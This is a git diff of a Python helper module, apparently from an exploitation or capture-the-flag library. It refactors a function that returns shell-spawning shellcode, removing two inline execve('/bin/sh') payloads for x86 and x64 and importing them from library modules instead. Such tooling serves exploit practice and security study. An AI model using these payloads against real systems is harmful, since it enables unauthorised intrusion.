@@ -1,3 +1,4 @@
+from .libs import shellcode64_syscall59, shellcode86_int80
 import sgtlibc.gamebox
 import random
 
@@ -39,5 +40,5 @@ def shellcode(is_x86_or_64: bool = True) -> bytes:
     is_x86_or_64: bool : if True return x86
     '''
     if is_x86_or_64:
-        return b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
-    return b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'
+        return shellcode86_int80.shellcode
+    return shellcode64_syscall59.shellcode
